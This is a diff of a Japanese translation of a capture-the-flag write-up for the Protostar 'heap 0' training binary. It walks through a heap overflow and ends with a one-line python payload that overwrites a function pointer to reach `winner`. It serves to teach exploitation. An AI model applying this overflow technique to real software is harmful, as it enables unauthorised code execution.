@@ -1,7 +1,9 @@
 # protostar heap 0
 
 <!-- Let's take a look at the binary. Also this challenge is a bit different from the others, the goal is to run the `winner` function. Also I recompiled this challenge from source: -->
-バイナリを見てみましょう。また、このチャレンジは他のチャレンジとは少し異なり、ゴールは `winner` 関数を実行することです。また、私はこのチャレンジをソースから再コンパイルしました。
+バイナリを見てみましょう。
+また、このチャレンジは他のチャレンジとは少し異なり、ゴールは `winner` 関数を実行することです。
+また、私はこのチャレンジをソースから再コンパイルしました。
 
 ```
 $    file heap0
@@ -22,7 +24,9 @@ level has not been passed
 ```
 
 <!-- So we can see it prints out what looks like two heap addresses, and takes in input as an argument. In addition to that we see that there is no PIE, and it is a 32 bit binary. When we take a look at the main function in Ghidra, we see this: -->
-つまり、2つのヒープアドレスのようなものを出力し、引数として入力を受け取っていることがわかります。さらに、PIEがないこと、32ビットバイナリであることもわかります。Ghidraのmain関数を見てみると、こんな感じです。
+つまり、2つのヒープアドレスのようなものを出力し、引数として入力を受け取っていることがわかります。
+さらに、PIEがないこと、32ビットバイナリであることもわかります。
+Ghidraのmain関数を見てみましょう:
 
 ```
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
@@ -52,7 +56,11 @@ undefined4 main(undefined4 param_1,int param_2)
 これはヒープオーバーフローのバグになります。`ptr1` が指すアドレスを実行します。
 
 <!-- So we have an overflow. With it we will use it to overwrite the value of `ptr1` to be that of the `winner` function. When we ran it, we can see that `ptr0` was at `0x56c08160` and `ptr1` was at `0x56c081b0` (for the second iteration of running it). So after `0x56c081b0 - 0x56c08160 = 0x50` bytes of space between the start of our input and the instruction pointer stored in `ptr1`. Next we need the address of `winner`: -->
-つまり、オーバーフローが発生しています。これを利用して、 `ptr1` の値を `winner` 関数の値に上書きします。実行すると、`ptr0` の値は `0x56c08160` で、`ptr1` の値は `0x56c081b0` (実行の2回目の繰り返し) であることがわかります。つまり、 `0x56c081b0 - 0x56c08160 = 0x50` バイトのスペースが、入力の開始点と `ptr1` に格納されている命令ポインタの間にあるわけです。次に、`winner` のアドレスが必要です。
+つまり、オーバーフローが発生しています。
+これを利用して、 `ptr1` の値を `winner` 関数の値に上書きします。
+実行すると、`ptr0` の値は `0x56c08160` で、`ptr1` の値は `0x56c081b0` (実行の2回目の繰り返し) であることがわかります。
+つまり、 `0x56c081b0 - 0x56c08160 = 0x50` バイトのスペースが、入力の開始点と `ptr1` に格納されている命令ポインタの間にあるわけです。
+次に、`winner` のアドレスが必要です。
 
 ```
 $    objdump -D heap0 | grep winner
@@ -60,7 +68,8 @@ $    objdump -D heap0 | grep winner
 080484e1 <nowinner>:
 ```
 
-With that, we have everything we need to solve the challenge:
+<!-- With that, we have everything we need to solve the challenge: -->
+これさえあれば、チャレンジに必要なものはすべて揃っています。
 
 ```
 $    ./heap0 `python -c 'print "0"*0x50 + "\xb6\x84\x04\x08"'`
